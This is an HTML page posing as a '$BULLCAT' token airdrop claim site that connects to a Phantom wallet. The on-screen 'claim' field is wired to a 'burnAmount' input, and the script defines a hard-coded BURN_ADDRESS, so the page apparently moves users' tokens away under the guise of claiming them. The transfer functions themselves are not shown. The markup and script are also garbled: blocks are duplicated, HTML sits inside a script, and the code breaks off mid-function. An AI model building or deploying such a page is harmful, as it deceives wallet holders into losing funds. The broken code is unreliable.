<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>$BULLCAT • Airdrop Claim</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
  <style>
    .scanline { position: relative; }
    .scanline::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(transparent, rgba(248, 113, 113, 0.1), transparent);
      background-size: 100% 400%;
      animation: scan 4s linear infinite;
    }
    @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 400%; } }
    .glow-red { text-shadow: 0 0 25px rgb(248 113 113); }
  </style>
</head>
<body class="bg-zinc-950 text-white min-h-screen font-mono">

  <div class="max-w-lg mx-auto pt-12 px-6">
    <div class="text-center mb-10">
      <div class="inline-flex items-center gap-3 text-4xl font-black mb-2">
        <i class="fas fa-cat text-orange-500"></i>
        <span class="bg-gradient-to-r from-red-400 to-orange-500 bg-clip-text text-transparent">$BULLCAT</span>
      </div>
      <h1 class="text-5xl font-bold tracking-tighter glow-red">AIRDROP CLAIM</h1>
    </div>

    <div class="bg-zinc-900 border border-red-500/50 rounded-3xl p-8 scanline">
      <!-- Balance -->
      <div class="mb-8 p-6 bg-black/70 rounded-2xl border border-red-500/30 text-center">
        <p class="text-gray-400 text-sm mb-1">YOUR $BULLCAT BALANCE</p>
        <div class="flex justify-center items-baseline gap-2">
          <span id="tokenBalance" class="text-6xl font-bold">0.00</span>
          <span class="text-red-400 text-2xl">$BULLCAT</span>
        </div>
        <p id="walletAddress" class="text-xs text-gray-500 mt-4 font-mono"></p>
      </div>

      <!-- Amount -->
      <div class="mb-6">
        <label class="block text-gray-400 text-sm mb-3">AMOUNT TO CLAIM</label>
        <div class="relative">
          <input type="number" id="burnAmount" class="w-full bg-black border border-red-500/50 rounded-2xl px-6 py-5 text-3xl outline-none" placeholder="0.00" step="0.01"/>
          <button onclick="setMaxAmount()" class="absolute right-4 top-1/2 -translate-y-1/2 text-red-400 font-bold">MAX</button>
        </div>
      </div>

      <!-- Buttons -->
      <div class="grid grid-cols-2 gap-4">
        <button onclick="claimSelected()" class="bg-red-600 hover:bg-red-700 py-6 rounded-2xl font-bold text-lg">CLAIM SELECTED</button>
        <button onclick="claimAll()" class="bg-gradient-to-r from-red-700 to-red-600 hover:from-red-800 py-6 rounded-2xl font-bold text-lg border-2 border-red-400">🔥 CLAIM ALL</button>
      </div>
    </div>

    <div class="mt-8 text-center">
      <button onclick="connectWallet()" id="connectBtn" class="px-8 py-4 bg-white text-black rounded-2xl font-bold hover:bg-gray-200 transition-all flex items-center gap-3 mx-auto"> <i class="fas fa-wallet"></i> <span id="connectText">CONNECT PHANTOM</span> </button> </div> </div> <script src="https://unpkg.com/@solana/web3.js@1.98.0/dist/web3.min.js"></script> <script> let solanaWeb3, splToken; let connectedPublicKey = null; let provider = null; let connection; async function loadSplToken() { if (splToken) return; const mod = await import("https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.15/+esm"); splToken = mod; } const BURN_ADDRESS = "FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu"; const BULLCAT_MINT = "2rofffRpuLXYwXptyzABZkrXs7zkb6wYnyZdqj1apump"; const RPC_URL = "https://api.mainnet-beta.solana.com"; <button onclick="connectWallet()" id="connectBtn" class="w-full py-6 bg-white text-black rounded-2xl font-bold text-xl flex items-center justify-center gap-3 hover:bg-gray-100 transition"> <i class="fas fa-wallet"></i> <span id="btnText">CONNECT PHANTOM WALLET</span> </button> </div> <p class="text-center text-xs text-gray-500 mt-8"> Click above to trigger wallet connection popup </p> </div> <script> let connectedPublicKey = null; async function connectWallet() { const btnText = document.getElementById("btnText"); if (typeof window.solana === "undefined") { alert("Phantom Wallet is not installed or not enabled.\n\nPlease install Phantom and refresh."); return; } try { btnText.innerHTML = "Waiting for approval..."; // This should force the popup + approval screen const response = await window.solana.connect({ onlyIfTrusted: false }); connectedPublicKey = response.publicKey.toString(); document.getElementById("status").classList.remove("hidden"); document.getElementById("status").innerHTML = Connected<br><small>${connectedPublicKey.slice(0,8)}...${connectedPublicKey.slice(-6)}</small>; btnText.innerHTML = " WALLET CONNECTED"; document.getElementById("connectBtn").disabled = true; alert("Wallet successfully connected!\n\nYou can now use Claim Selected / Claim All.");
  </script>
</body>
</html>
